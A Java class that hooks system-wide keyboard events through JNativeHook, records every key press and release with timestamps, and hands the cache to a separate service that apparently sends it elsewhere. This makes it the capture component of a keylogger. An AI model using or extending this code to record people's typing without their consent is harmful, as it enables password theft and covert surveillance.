package keys;

import handlers.KeyStorage;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.util.ArrayList;
import java.util.List;


public class NativeKeyboard implements NativeKeyListener {
    // Where keystroke data is kept once it has been tracked from the JNativeHook method below
    private List<KeyStorage> keyCache = new ArrayList<>();

    // nativeKeyPressed, nativeKeyReleased, nativeKeyTyped are all generated method from the JNH lib that
    // track keys pressed and released. These methods send collected dat to the prev declared ArrayList.
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        keyCache.add(new KeyStorage(e.getKeyCode(), true, System.currentTimeMillis()));
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        keyCache.add(new KeyStorage(e.getKeyCode(), false, System.currentTimeMillis()));
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {

    }

    // Methods from ManageService class to handle exceptions and handle sending keycache to that class
    public void onSend() {
        keyCache.clear();
    }

    public void onFail() {
        System.out.println("Keystroke data failed to be sent.");
    }

    public List<KeyStorage> getKeyCache() {
        return keyCache;
    }
}